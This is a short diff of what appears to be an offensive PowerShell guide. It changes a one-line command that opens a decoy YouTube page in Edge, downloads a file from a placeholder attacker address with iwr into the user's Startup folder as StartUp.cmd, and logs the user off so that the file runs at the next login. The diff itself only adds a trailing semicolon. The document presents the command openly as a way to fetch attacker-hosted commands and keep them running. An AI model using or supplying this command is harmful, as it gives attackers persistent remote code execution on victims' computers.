@@ -26,7 +26,7 @@ c:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c "&{$word = new-obje
 ```
 Request the commands hosted on a particular site
 ```Powershell
-start msedge `https://www.youtube.com/watch?v=uXbGQiXsRes';iwr https://<YourIP>/Direcotory/filename -o "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\StartUp.cmd"; shutdown /l
+start msedge `https://www.youtube.com/watch?v=uXbGQiXsRes';iwr https://<YourIP>/Direcotory/filename -o "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\StartUp.cmd"; shutdown /l;
 ```
 
 # Example .cmd
